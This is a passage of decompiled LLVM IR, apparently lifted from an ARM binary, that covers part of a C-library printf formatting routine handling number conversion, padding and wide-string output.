dec_label_pc_11408:                               ; preds = %.thread84, %bb140, %dec_label_pc_113fc
  %v0_1143486 = phi i32 [ %v5_113e8, %.thread84 ], [ %v4_113bc, %bb140 ], [ %v4_113bc, %dec_label_pc_113fc ]
  br label %dec_label_pc_1140c

dec_label_pc_1140c:                               ; preds = %dec_label_pc_113fc, %dec_label_pc_11408
  %v0_1143485 = phi i32 [ %v0_1143486, %dec_label_pc_11408 ], [ %v4_113bc, %dec_label_pc_113fc ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_11408 ], [ 6, %dec_label_pc_113fc ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_1140c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1140c, i32* %r3.global-to-local, align 4
  %v1_11410 = icmp slt i32 %v3_1140c, 0
  %v7_11414. = select i1 %v1_11410, i32 %v7_11414, i32 32
  store i32 %v7_11414., i32* @sb, align 4
  br i1 %v7_1141c, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_1140c
  store i32 %v2_11368, i32* @lr, align 4
  %v2_11424 = load i32, i32* %ip.global-to-local, align 4
  %v5_11424 = mul i32 %v2_11424, 4
  %v6_11424 = add i32 %v5_11424, %v2_11368
  store i32 %v6_11424, i32* %r3.global-to-local, align 4
  %v2_11428 = add i32 %v6_11424, -260
  %v3_11428 = inttoptr i32 %v2_11428 to i32*
  %v4_11428 = load i32, i32* %v3_11428, align 4
  store i32 %v4_11428, i32* %r3.global-to-local, align 4
  %v2_11430 = and i32 %v4_11428, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_1140c, %.thread16
  %storemerge94 = phi i32 [ %v2_11430, %.thread16 ], [ 1024, %dec_label_pc_1140c ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_1143485, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_1143c = call i32 @_load_inttype()
  %v0_11440 = load i32, i32* @r1, align 4
  store i32 %v0_11440, i32* %r2.global-to-local, align 4
  %v0_1144c = load i32, i32* @r4, align 4
  store i32 %v0_1144c, i32* %r3.global-to-local, align 4
  store i32 %v2_11450, i32* %r0.global-to-local, align 4
  %v0_11454 = load i32, i32* @r5, align 4
  %v6_11458 = call i32 @_uintmaxtostr(i8* %v5_11458, i32 %v0_1143c, i32 %v0_11440, i32 %v0_1144c, i32 %v0_11454)
  store i32 %v6_11458, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_11458, i32* @r6, align 4
  br i1 %v3_11468, label %bb148, label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %bb145
  %v7_11458 = inttoptr i32 %v6_11458 to i8*
  %v3_1146c = load i8, i8* %v7_11458, align 1
  %v7_11470 = icmp eq i8 %v3_1146c, 45
  %v2_11478 = or i32 %v0_113dc, 2
  %v2_11478.stack_var_-316.4 = select i1 %v7_11470, i32 %v2_11478, i32 %v0_113dc
  store i32 %v2_11478.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_11470, label %.thread18, label %dec_label_pc_1148c

.thread18:                                        ; preds = %dec_label_pc_1146c
  %v3_1147c = add i32 %v6_11458, 1
  store i32 %v3_1147c, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_1148c:                               ; preds = %dec_label_pc_1146c
  %v1_1148c = and i32 %v2_11478.stack_var_-316.4, 2
  %v2_1148c = icmp eq i32 %v1_1148c, 0
  br i1 %v2_1148c, label %dec_label_pc_11498, label %bb146

bb146:                                            ; preds = %dec_label_pc_1148c
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_11498:                               ; preds = %dec_label_pc_1148c
  %v1_11498 = urem i32 %v2_11478.stack_var_-316.4, 2
  %v2_11498 = icmp eq i32 %v1_11498, 0
  br i1 %v2_11498, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_11498
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_11498, %bb147
  %v0_114f4 = phi i32 [ %v6_11458, %bb145 ], [ %v3_1147c, %.thread18 ], [ %v6_11458, %dec_label_pc_11498 ], [ %v6_11458, %bb147 ], [ %v6_11458, %bb146 ]
  %v0_114b0 = phi i32 [ %v0_113dc, %bb145 ], [ %v2_11478, %.thread18 ], [ %v0_113dc, %dec_label_pc_11498 ], [ %v0_113dc, %bb147 ], [ %v0_113dc, %bb146 ]
  %v3_114a0 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_114a0, i32* %r2.global-to-local, align 4
  store i32 %v0_114b0, i32* %r3.global-to-local, align 4
  %v1_114a8 = icmp slt i32 %v3_114a0, 0
  br i1 %v1_114a8, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_114d8 = phi i32 [ %v3_114a0, %bb148 ], [ 1, %bb149 ]
  %v1_114b0 = and i32 %v0_114b0, 16
  %v2_114b0 = icmp eq i32 %v1_114b0, 0
  store i32 %v2_11684, i32* %r3.global-to-local, align 4
  %v2_114b8 = sub i32 %v2_11684, %v0_114f4
  %v1_114bc = add i32 %v2_114b8, 127
  store i32 %v1_114bc, i32* @r5, align 4
  br i1 %v2_114b0, label %bb157, label %dec_label_pc_114c4

dec_label_pc_114c4:                               ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_114c4
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_114c4, %bb151
  br i1 %v7_114d0, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_114d8, %v1_114bc
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_114dc, label %dec_label_pc_114e4, label %bb157

dec_label_pc_114e4:                               ; preds = %bb155
  %v1_114e4 = inttoptr i32 %v0_114f4 to i8*
  %v2_114e4 = load i8, i8* %v1_114e4, align 1
  %v3_114e4 = zext i8 %v2_114e4 to i32
  store i32 %v3_114e4, i32* %r3.global-to-local, align 4
  %v7_114e8 = icmp eq i8 %v2_114e4, 48
  br i1 %v7_114e8, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_114e4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_114e4
  %v2_114f0 = add i32 %v2_114b8, 128
  store i32 %v2_114f0, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_1152c = phi i32 [ %v0_114d8, %bb155 ], [ %v0_114d8, %bb150 ], [ 1, %bb156 ], [ %v2_114f0, %.thread25 ], [ %v0_114d8, %bb154 ]
  %v1_114f4 = inttoptr i32 %v0_114f4 to i8*
  %v2_114f4 = load i8, i8* %v1_114f4, align 1
  %v3_114f4 = zext i8 %v2_114f4 to i32
  store i32 %v3_114f4, i32* %r3.global-to-local, align 4
  %v7_114f8 = icmp eq i8 %v2_114f4, 48
  br i1 %v7_114f8, label %dec_label_pc_11500, label %dec_label_pc_11528

dec_label_pc_11500:                               ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_11504 = load i32, i32* @r7, align 4
  %v7_11508 = icmp slt i32 %v0_11504, 6
  br i1 %v7_11508, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_11500
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_11500, %bb158
  br i1 %v7_1141c, label %.thread26, label %dec_label_pc_1151c

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1ca18.595 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_1169c

dec_label_pc_1151c:                               ; preds = %bb159
  %v2_1151c = icmp eq i32 %v5_1152c, 0
  br i1 %v2_1151c, label %bb160, label %dec_label_pc_11528

bb160:                                            ; preds = %dec_label_pc_1151c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1169c

dec_label_pc_11528:                               ; preds = %dec_label_pc_1151c, %bb157
  %v2_11528 = sub i32 %v5_1152c, %v1_114bc
  %tmp199 = icmp ugt i32 %v5_1152c, %v1_114bc
  br i1 %tmp199, label %.thread90, label %dec_label_pc_1169c

.thread90:                                        ; preds = %dec_label_pc_11528
  store i32 %v2_11528, i32* @r4, align 4
  br label %dec_label_pc_116b8thread-pre-split

dec_label_pc_11538:                               ; preds = %dec_label_pc_113ac
  br i1 %tmp196, label %dec_label_pc_11574, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11538
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_1154c = load i32, i32* @fp, align 4
  store i32 %v0_1154c, i32* %r0.global-to-local, align 4
  %v2_11550 = load i32, i32* %v1_11394, align 4
  %v5_11550 = load i32, i32* %v4_11550, align 4
  store i32 %v5_11550, i32* %r2.global-to-local, align 4
  store i32 %v2_11554, i32* %r3.global-to-local, align 4
  %v6_11558 = call i32 @_fpmaxtostr(i32 %v0_1154c, i32 %v2_11550, i32 %v5_11550, i32* nonnull %stack_var_-328, i32 70072)
  store i32 %v6_11558, i32* %r0.global-to-local, align 4
  %v1_1155c = icmp slt i32 %v6_11558, 0
  br i1 %v1_1155c, label %dec_label_pc_11808, label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_11540
  %v2_11568 = add i32 %v6_11558, %stack_var_-336.2
  store i32 %v2_11568, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117f4

dec_label_pc_11574:                               ; preds = %dec_label_pc_11538
  br i1 %v3_11578, label %dec_label_pc_11614, label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11574
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_11574, label %dec_label_pc_1158c, label %dec_label_pc_115dc

dec_label_pc_1158c:                               ; preds = %dec_label_pc_1157c
  %v2_1158c = load i32, i32* %v1_11394, align 4
  store i32 %v2_1158c, i32* %r3.global-to-local, align 4
  %v9_11590 = icmp eq i32 %v2_1158c, 0
  store i32 %v2_1158c, i32* %stack_var_-44, align 4
  br i1 %v9_11590, label %dec_label_pc_116a4, label %dec_label_pc_1159c

dec_label_pc_1159c:                               ; preds = %dec_label_pc_1158c
  %v3_1159c = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_1159c, i32* %r3.global-to-local, align 4
  store i32 %v2_115a0, i32* @r0, align 4
  %v5_115ac = icmp slt i32 %v3_1159c, -1
  br i1 %v5_115ac, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_1159c
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_1159c, %bb161
  %storemerge193 = phi i32 [ %v3_1159c, %bb161 ], [ -1, %dec_label_pc_1159c ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_115a0, i32* @r1, align 4
  store i32 %v2_115b4, i32* %r3.global-to-local, align 4
  %v0_115b8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_115b8, i32* %r0.global-to-local, align 4
  %v7_115bc = icmp eq i32 %v0_115b8, -1
  store i32 %v0_115b8, i32* @r5, align 4
  br i1 %v7_115bc, label %dec_label_pc_11808, label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %bb162
  %v0_115c8 = load i32, i32* @sl, align 4
  store i32 %v0_115c8, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_115c8, i32* @r6, align 4
  br label %dec_label_pc_116b8

dec_label_pc_115dc:                               ; preds = %dec_label_pc_1157c
  store i32 %v2_11684, i32* %r8.global-to-local, align 4
  %v2_115e0 = load i32, i32* %v1_11394, align 4
  store i32 %v2_115b4, i32* %r2.global-to-local, align 4
  store i32 %v2_11684, i32* %r0.global-to-local, align 4
  %v3_115ec = call i32 @__GI_wcrtomb(i32 %v2_11684, i32 %v2_115e0, i32 %v2_115b4)
  store i32 %v3_115ec, i32* %r0.global-to-local, align 4
  %v7_115f0 = icmp eq i32 %v3_115ec, -1
  store i32 %v3_115ec, i32* @r5, align 4
  br i1 %v7_115f0, label %dec_label_pc_11808, label %dec_label_pc_115fc

dec_label_pc_115fc:                               ; preds = %dec_label_pc_115dc
  %v0_115fc = load i32, i32* @sl, align 4
  store i32 %v0_115fc, i32* @r4, align 4
  store i32 %v2_11684, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_1160c = trunc i32 %v0_115fc to i8
  %v2_1160c = load i32, i32* %r8.global-to-local, align 4
  %v4_1160c = add i32 %v2_1160c, %v3_115ec
  %v5_1160c = inttoptr i32 %v4_1160c to i8*
  store i8 %v1_1160c, i8* %v5_1160c, align 1
  %v0_116bc.pre.pre = load i32, i32* @r5, align 4
  %v1_116bc.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_116b8thread-pre-split

dec_label_pc_11614:                               ; preds = %dec_label_pc_11574
  br i1 %v3_11618, label %dec_label_pc_11678, label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_11614
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_11624 = load i32, i32* %v1_11394, align 4
  br i1 %v7_11614, label %dec_label_pc_11624, label %dec_label_pc_11650

dec_label_pc_11624:                               ; preds = %dec_label_pc_1161c
  store i32 %v2_11624, i32* @r6, align 4
  %v2_11628 = icmp eq i32 %v2_11624, 0
  br i1 %v2_11628, label %dec_label_pc_116a4, label %dec_label_pc_11630

dec_label_pc_11630:                               ; preds = %dec_label_pc_11624, %dec_label_pc_11680
  %v0_11640 = phi i32 [ %v2_11624, %dec_label_pc_11624 ], [ %v3_11690, %dec_label_pc_11680 ]
  %v3_11630 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_11630, i32* %r3.global-to-local, align 4
  %v5_1163c = icmp slt i32 %v3_11630, -1
  br i1 %v5_1163c, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_11630
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_11630, %bb163
  %storemerge194 = phi i32 [ %v3_11630, %bb163 ], [ -1, %dec_label_pc_11630 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_11640, i32* %r0.global-to-local, align 4
  %v1_11644 = inttoptr i32 %v0_11640 to i8*
  %v2_11644 = call i32 @strnlen(i8* %v1_11644)
  store i32 %v2_11644, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116ac

dec_label_pc_11650:                               ; preds = %dec_label_pc_1161c
  store i32 %v2_11624, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_11684, i32* @r6, align 4
  store i32 %v2_11624, i32* %stack_var_-180, align 4
  br label %dec_label_pc_116b8thread-pre-split

dec_label_pc_11678:                               ; preds = %dec_label_pc_11614
  br i1 %v7_11678, label %dec_label_pc_11680, label %dec_label_pc_11808

dec_label_pc_11680:                               ; preds = %dec_label_pc_11678
  %v0_11680 = call i32 @__errno_location()
  store i32 %v0_11680, i32* %r0.global-to-local, align 4
  %v1_11688 = inttoptr i32 %v0_11680 to i32*
  %v2_11688 = load i32, i32* %v1_11688, align 4
  store i32 %v2_11688, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_11690 = call i32 @__GI___glibc_strerror_r(i32 %v2_11688, i32 %v2_11684, i32 128)
  store i32 %v3_11690, i32* %r0.global-to-local, align 4
  store i32 %v3_11690, i32* @r6, align 4
  br label %dec_label_pc_11630

dec_label_pc_1169c:                               ; preds = %dec_label_pc_11528, %.thread26, %bb160
  %v0_116bc.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_114bc, %dec_label_pc_11528 ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_116b8thread-pre-split

dec_label_pc_116a4:                               ; preds = %dec_label_pc_11624, %dec_label_pc_1158c
  store i32 ptrtoint ([7 x i8]* @global_var_1ca20.598 to i32), i32* @r6, align 4
  br label %dec_label_pc_116ac

dec_label_pc_116ac:                               ; preds = %bb164, %dec_label_pc_116a4
  %storemerge = phi i32 [ 6, %dec_label_pc_116a4 ], [ %v2_11644, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_116b8

dec_label_pc_116b8thread-pre-split:               ; preds = %.thread90, %dec_label_pc_115fc, %dec_label_pc_11650, %dec_label_pc_1169c
  %v1_116bc.pre = phi i32 [ 0, %dec_label_pc_1169c ], [ %v1_116bc.pre.pre, %dec_label_pc_115fc ], [ 0, %dec_label_pc_11650 ], [ %v2_11528, %.thread90 ]
  %v0_116bc.pre = phi i32 [ %v0_116bc.pre81, %dec_label_pc_1169c ], [ %v0_116bc.pre.pre, %dec_label_pc_115fc ], [ 1, %dec_label_pc_11650 ], [ %v1_114bc, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_114b0, %dec_label_pc_1169c ], [ %v0_113dc, %dec_label_pc_115fc ], [ %v0_113dc, %dec_label_pc_11650 ], [ %v0_114b0, %.thread90 ]
  %v0_116b8.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_116b8

dec_label_pc_116b8:                               ; preds = %dec_label_pc_116b8thread-pre-split, %dec_label_pc_115c8, %dec_label_pc_116ac
  %v1_116f8 = phi i32 [ %v1_116bc.pre, %dec_label_pc_116b8thread-pre-split ], [ %v0_115c8, %dec_label_pc_115c8 ], [ 0, %dec_label_pc_116ac ]
  %v0_116bc = phi i32 [ %v0_116bc.pre, %dec_label_pc_116b8thread-pre-split ], [ %v0_115b8, %dec_label_pc_115c8 ], [ %storemerge, %dec_label_pc_116ac ]
  %v0_116c4 = phi i32 [ %v0_116b8.pr, %dec_label_pc_116b8thread-pre-split ], [ 11, %dec_label_pc_115c8 ], [ 11, %dec_label_pc_116ac ]
  %v0_11700 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_116b8thread-pre-split ], [ %v0_113dc, %dec_label_pc_115c8 ], [ %v0_113dc, %dec_label_pc_116ac ]
  %v7_116b8 = icmp eq i32 %v0_116c4, 11
  %v2_116bc = add i32 %v0_116bc, %v1_116f8
  br i1 %v7_116b8, label %dec_label_pc_116d4, label %bb165

bb165:                                            ; preds = %dec_label_pc_116b8
  %v7_116cc = icmp sgt i32 %v0_116c4, 5
  %. = select i1 %v7_116cc, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_116d0 = add i32 %., %v2_116bc
  br label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %dec_label_pc_116b8, %bb165
  %v0_116e8 = phi i32 [ %v2_116bc, %dec_label_pc_116b8 ], [ %v2_116d0, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_116d8 = sub i32 %tmp97, %v0_116e8
  %v3_116d8 = icmp uge i32 %tmp97, %v0_116e8
  %v9_116d8 = icmp eq i32 %tmp97, %v0_116e8
  %v2_116dc = xor i1 %v3_116d8, true
  %v3_116dc = or i1 %v9_116d8, %v2_116dc
  br i1 %v3_116dc, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_116d4
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_116d4, %bb166
  %v2_116e0 = xor i1 %v9_116d8, true
  %v3_116e0 = and i1 %v3_116d8, %v2_116e0
  br i1 %v3_116e0, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_116e8.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_116d8, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_116f8 = phi i32 [ %v1_116e8.pre, %._crit_edge ], [ %v2_116d8, %bb168 ]
  %v2_116e8 = add i32 %v0_116e8, %stack_var_-336.2
  %v2_116ec = add i32 %v2_116e8, %v2_116f8
  store i32 %v2_116ec, i32* %ip.global-to-local, align 4
  store i32 %v0_11700, i32* %r3.global-to-local, align 4
  %v0_116f4 = load i32, i32* @sb, align 4
  %v7_116f4 = icmp eq i32 %v0_116f4, 48
  br i1 %v7_116f4, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_116f8 = add i32 %v2_116f8, %v1_116f8
  store i32 %v3_116f8, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_11714 = phi i32 [ %v2_116f8, %bb169 ], [ 0, %bb170 ]
  %v1_11700 = and i32 %v0_11700, 8
  store i32 %v1_11700, i32* @r8, align 4
  %v2_11700 = icmp eq i32 %v1_11700, 0
  br i1 %v2_11700, label %dec_label_pc_1170c, label %dec_label_pc_11728

dec_label_pc_1170c:                               ; preds = %.thread29
  %v0_1170c = load i32, i32* @fp, align 4
  store i32 %v0_1170c, i32* %r0.global-to-local, align 4
  store i32 %v0_11714, i32* %r2.global-to-local, align 4
  %v4_11718 = call i32 @_charpad(i32 %v0_1170c, i8 32, i32 %v0_11714)
  store i32 %v4_11718, i32* %r0.global-to-local, align 4
  %v1_1171c = load i32, i32* @sl, align 4
  %v9_1171c = icmp eq i32 %v4_11718, %v1_1171c
  br i1 %v9_1171c, label %dec_label_pc_11724, label %dec_label_pc_11808

dec_label_pc_11724:                               ; preds = %dec_label_pc_1170c
  %v0_11724 = load i32, i32* @r8, align 4
  store i32 %v0_11724, i32* @sl, align 4
  %v0_11730.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11728

dec_label_pc_11728:                               ; preds = %.thread29, %dec_label_pc_11724
  %v0_11730 = phi i32 [ %v0_116c4, %.thread29 ], [ %v0_11730.pre, %dec_label_pc_11724 ]
  %v0_1172c = load i32, i32* @fp, align 4
  %v2_11730 = add i32 %v0_11730, ptrtoint (i32* @global_var_1ca28.600 to i32)
  store i32 %v2_11730, i32* %r0.global-to-local, align 4
  %v2_11734 = inttoptr i32 %v2_11730 to i8*
  %v3_11734 = call i32 @__GI_fputs_unlocked(i8* %v2_11734, i32 %v0_1172c)
  %v0_11738 = load i32, i32* @fp, align 4
  store i32 %v0_11738, i32* %r0.global-to-local, align 4
  %v0_11740 = load i32, i32* @r4, align 4
  store i32 %v0_11740, i32* %r2.global-to-local, align 4
  %v4_11744 = call i32 @_charpad(i32 %v0_11738, i8 48, i32 %v0_11740)
  store i32 %v4_11744, i32* %r0.global-to-local, align 4
  %v1_11748 = load i32, i32* @r4, align 4
  %v9_11748 = icmp eq i32 %v4_11744, %v1_11748
  br i1 %v9_11748, label %dec_label_pc_11750, label %dec_label_pc_11808

dec_label_pc_11750:                               ; preds = %dec_label_pc_11728
  %v3_11750 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_11750, i32* %r3.global-to-local, align 4
  %v2_11754 = icmp eq i32 %v3_11750, 0
  br i1 %v2_11754, label %dec_label_pc_11764, label %dec_label_pc_117c4thread-pre-split

dec_label_pc_11764:                               ; preds = %dec_label_pc_11750
  %v0_11764 = load i32, i32* @r5, align 4
  %v2_11764 = icmp eq i32 %v0_11764, 0
  br i1 %v2_11764, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_11764
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_11764
  %v1_1176c = load i32, i32* @r6, align 4
  store i32 %v1_1176c, i32* %r0.global-to-local, align 4
  %v1_11774 = load i32, i32* @fp, align 4
  store i32 %v1_11774, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 71548, i32* @lr, align 4
  %v1_11778 = xor i1 %v2_11764, true
  call void @__pseudo_cond_branch(i1 %v1_11778, i32 ptrtoint (i32* @global_var_14e7c.591 to i32))
  %v0_1177c = load i32, i32* %r0.global-to-local, align 4
  %v1_1177c = load i32, i32* @r5, align 4
  %v9_1177c = icmp eq i32 %v0_1177c, %v1_1177c
  br i1 %v9_1177c, label %dec_label_pc_117dc, label %dec_label_pc_11808

dec_label_pc_11788:                               ; preds = %dec_label_pc_117c4
  %v2_11788 = icmp ult i32 %v1_1178c, 128
  %.v1_1178c = select i1 %v2_11788, i32 %v1_1178c, i32 128
  store i32 %.v1_1178c, i32* @r2, align 4
  %v0_11794 = call i32 @__GI_wcsrtombs()
  store i32 %v0_11794, i32* @r4, align 4
  %v2_11798 = icmp eq i32 %v0_11794, 0
  store i32 %v0_11794, i32* %r3.global-to-local, align 4
  store i32 %v2_11684, i32* %r0.global-to-local, align 4
  %v0_117a8 = load i32, i32* @fp, align 4
  store i32 %v0_117a8, i32* %r2.global-to-local, align 4
  br i1 %v2_11798, label %dec_label_pc_117b8, label %dec_label_pc_117b0

dec_label_pc_117b0:                               ; preds = %dec_label_pc_11788
  %v3_117b0 = call i32 @__stdio_fwrite(i32 %v2_11684, i32 %v0_11794, i32 %v0_117a8)
  store i32 %v3_117b0, i32* %r0.global-to-local, align 4
  store i32 %v3_117b0, i32* %r3.global-to-local, align 4
  %v1_117b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_11788, %dec_label_pc_117b0
  %v1_117b8 = phi i32 [ 0, %dec_label_pc_11788 ], [ %v1_117b8.pre, %dec_label_pc_117b0 ]
  %v0_117bc = phi i32 [ 0, %dec_label_pc_11788 ], [ %v3_117b0, %dec_label_pc_117b0 ]
  %v9_117b8 = icmp eq i32 %v0_117bc, %v1_117b8
  %v1_117bc = load i32, i32* @r5, align 4
  %v2_117bc = sub i32 %v1_117bc, %v0_117bc
  store i32 %v2_117bc, i32* @r5, align 4
  br i1 %v9_117b8, label %dec_label_pc_117c4, label %dec_label_pc_11808

dec_label_pc_117c4thread-pre-split:               ; preds = %dec_label_pc_11750
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_117c8.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_117c4

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117c4thread-pre-split, %dec_label_pc_117b8
  %v1_1178c = phi i32 [ %v0_117c8.pr, %dec_label_pc_117c4thread-pre-split ], [ %v2_117bc, %dec_label_pc_117b8 ]
  store i32 %v2_11684, i32* @r6, align 4
  %v2_117c8 = icmp eq i32 %v1_1178c, 0
  store i32 %v2_115a0, i32* @r1, align 4
  store i32 %v2_115b4, i32* %r3.global-to-local, align 4
  store i32 %v2_11684, i32* @r0, align 4
  br i1 %v2_117c8, label %dec_label_pc_117dc, label %dec_label_pc_11788

dec_label_pc_117dc:                               ; preds = %dec_label_pc_117c4, %.thread36
  %v0_117dc = load i32, i32* @fp, align 4
  store i32 %v0_117dc, i32* %r0.global-to-local, align 4
  %v0_117e4 = load i32, i32* @sl, align 4
  store i32 %v0_117e4, i32* %r2.global-to-local, align 4
  %v4_117e8 = call i32 @_charpad(i32 %v0_117dc, i8 32, i32 %v0_117e4)
  store i32 %v4_117e8, i32* %r0.global-to-local, align 4
  %v1_117ec = load i32, i32* @sl, align 4
  %v9_117ec = icmp eq i32 %v4_117e8, %v1_117ec
  br i1 %v9_117ec, label %dec_label_pc_117f4, label %dec_label_pc_11808

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117dc, %dec_label_pc_11564, %dec_label_pc_11388
  %stack_var_-316.3 = phi i32 [ %v0_113dc, %dec_label_pc_11388 ], [ %v0_11700, %dec_label_pc_117dc ], [ %v0_113dc, %dec_label_pc_11564 ]
  %stack_var_-336.3 = phi i32 [ %stack_var_-336.2, %dec_label_pc_11388 ], [ %v2_116ec, %dec_label_pc_117dc ], [ %v2_11568, %dec_label_pc_11564 ]
  %v3_117f4 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_117f4, i32* @r4, align 4
  br label %dec_label_pc_117f8

dec_label_pc_117f8:                               ; preds = %dec_label_pc_11298, %dec_label_pc_117f4
  %v0_117f8 = phi i32 [ %v0_117f8.pre, %dec_label_pc_11298 ], [ %v3_117f4, %dec_label_pc_117f4 ]
  %v0_113dc = phi i32 [ %tmp100, %dec_label_pc_11298 ], [ %stack_var_-316.3, %dec_label_pc_117f4 ]
  %stack_var_-336.4 = phi i32 [ 0, %dec_label_pc_11298 ], [ %stack_var_-336.3, %dec_label_pc_117f4 ]
  store i32 %v0_117f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_112b0.outer

dec_label_pc_112b0.outer:                         ; preds = %dec_label_pc_11800, %dec_label_pc_117f8
  %v5_112dc = phi i32 [ %v1_1130c, %dec_label_pc_11800 ], [ %v0_117f8, %dec_label_pc_117f8 ]
  %v0_112b049 = phi i32 [ %v1_11800, %dec_label_pc_11800 ], [ %v0_117f8, %dec_label_pc_117f8 ]
  %stack_var_-336.1.ph = phi i32 [ %stack_var_-336.2, %dec_label_pc_11800 ], [ %stack_var_-336.4, %dec_label_pc_117f8 ]
  %v1_112b0180 = inttoptr i32 %v0_112b049 to i8*
  %v2_112b0181 = load i8, i8* %v1_112b0180, align 1
  %v3_112b0182 = zext i8 %v2_112b0181 to i32
